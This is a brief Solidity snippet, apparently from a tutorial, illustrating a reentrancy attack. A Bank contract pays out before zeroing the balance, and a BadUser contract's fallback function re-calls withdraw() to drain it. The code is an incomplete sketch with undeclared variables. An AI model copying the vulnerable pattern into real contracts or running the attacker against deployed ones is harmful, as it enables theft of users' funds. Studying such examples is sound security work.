contract Bank {
    function withdraw(){
        uint amount = balances[msg.sender] ;

        //  会触发回退函数
        if(msg.sender.call.value(amount)() == false){
            throw ;
        }
        balances[msg.sender] = 0 ;
    }
}

contract BadUser {
    function money(address addr){
        Bank(addr).withdraw();
    }

    function () payable {
        Bank(addr).withdraw() ;
    }
}
